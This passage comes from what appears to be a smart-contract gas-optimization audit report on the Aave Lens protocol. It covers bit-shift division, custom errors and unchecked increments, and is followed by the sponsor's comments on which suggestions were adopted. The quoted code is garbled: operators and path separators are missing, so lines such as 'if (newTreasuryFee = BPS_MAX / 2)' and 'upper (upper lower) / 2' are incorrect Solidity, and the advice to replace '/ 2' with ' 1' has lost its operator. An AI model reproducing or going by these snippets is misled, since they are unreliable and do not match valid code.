5 gas, the SHR opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.\n\nI suggest replacing / 2 with  1 here:\n\n    coremodulesModuleGlobals.sol:109:        if (newTreasuryFee = BPS_MAX / 2) revert Errors.InitParamsInvalid();\n    coreFollowNFT.sol:134:            uint256 center = upper (upper lower) / 2;\n    coreFollowNFT.sol:176:            uint256 center = upper (upper lower) / 2;\n\n### Errors\n\n#### Use Custom Errors instead of Revert Strings to save Gas\n\nI'm quite certain that the sponsor is aware of this optimization, as the library Errors contains a lot of custom errors. Therefore, I won't explain it (suffice to say, they are cheaper than require statements + revert strings).\n\nThe finding here is that the contracts ERC721Enumerable and ERC721Time don't benefit from this practice:\n\n    corebaseERC721Enumerable.sol:\n      53:         require(index < ERC721Time.balanceOf(owner), 'ERC721Enumerable: owner index out of bounds');\n      68:         require(\n      69              index < ERC721Enumerable.totalSupply(),\n      70              'ERC721Enumerable: global index out of bounds'\n      71          );\n\n    corebaseERC721Time.sol:\n       77:         require(owner != address(0), 'ERC721: balance query for the zero address');\n       86:         require(owner != address(0), 'ERC721: owner query for nonexistent token');\n       95:         require(mintTimestamp != 0, 'ERC721: mint timestamp query for nonexistent token');\n      109:         require(_exists(tokenId), 'ERC721: token data query for nonexistent token');\n      131:         require(_exists(tokenId), 'ERC721Metadata: URI query for nonexistent token');\n      152:         require(to != owner, 'ERC721: approval to current owner');\n      154:         require(\n      155              _msgSender() == owner || isApprovedForAll(owner, _msgSender()),\n      156              'ERC721: approve caller is not owner nor approved for all'\n      157          );\n      166:         require(_exists(tokenId), 'ERC721: approved query for nonexistent token');\n      175:         require(operator != _msgSender(), 'ERC721: approve to caller');\n      202:         require(\n      203              _isApprovedOrOwner(_msgSender(), tokenId),\n      204              'ERC721: transfer caller is not owner nor approved'\n      205          );\n      230:         require(\n      231              _isApprovedOrOwner(_msgSender(), tokenId),\n      232              'ERC721: transfer caller is not owner nor approved'\n      233          );\n      262:         require(\n      263              _checkOnERC721Received(from, to, tokenId, _data),\n      264              'ERC721: transfer to non ERC721Receiver implementer'\n      265          );\n      293:         require(_exists(tokenId), 'ERC721: operator query for nonexistent token');\n      324:         require(\n      325              _checkOnERC721Received(address(0), to, tokenId, _data),\n      326              'ERC721: transfer to non ERC721Receiver implementer'\n      327          );\n      343:         require(to != address(0), 'ERC721: mint to the zero address');\n      344:         require(!_exists(tokenId), 'ERC721: token already minted');\n      395:         require(ERC721Time.ownerOf(tokenId) == from, 'ERC721: transfer of token that is not own');\n      396:         require(to != address(0), 'ERC721: transfer to the zero address');\n\nI suggest using custom errors in ERC721Enumerable and ERC721Time.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1075423322):\n  Okay this is possibly the best gas report I have ever seen. Huge props to Dravee!\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1076895010):\n  Implementing a whole lot of this in a new PR, here are some notes:\n \n 1. Inlining the handle hash computation increased code size by ~3 bytes and increased gas by 4, so we're not implementing that.\n 2. Calldata instead of memory is valid but the reason we're doing this is to avoid stack too deep errors, follow NFT URI thing is a good catch though, and valid for the profile image URI too!\n 3. The = 0 initialization is there for clarity and I believe it's handled by the optimizer.\n \n Will write more, I'm currently at the unchecked increment section, which is valid. Anyway, C4 give this gigachad a medal.\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1077737245):\n  Included unchecked increments, and cached array lengths (where possible) too!\n \n Unchecked increments: aave/lens-protocol@37ab8ce(https://github.com/aave/lens-protocol/commit/37ab8cea46ec6cf1f1a20dd4f5d720c49da06dc2)<br\n Array length caching: aave/lens-protocol@a698476(https://github.com/aave/lens-protocol/commit/a698476590fb58eb7f698079714cba31e9d10a5e)<br\n \n The SHR sacrifices readability too much, though it's still valid. Lastly the custom errors I would say are not valid since that's just how ERC721 is built, we don't want to stray away from the standard, even in revert messages as much as possible.\n \n Overall this is a fantastic report!\n\nZer0dot (Aave Lens) commented(https://github.com/code-423n4/2022-02-aave-lens-findings/issues/47#issuecomment-1084955877):\n  PSA: The happy path short-circuiting is only partly valid in that it saves a minor amount of gas (2-3 opcodes) since even the \"sad path\" is evaluated lazily, if the first condition evaluates to false, the second condition is not evaluated.\n\n\n\n*\n\n\n"
            }
        ]
    }
]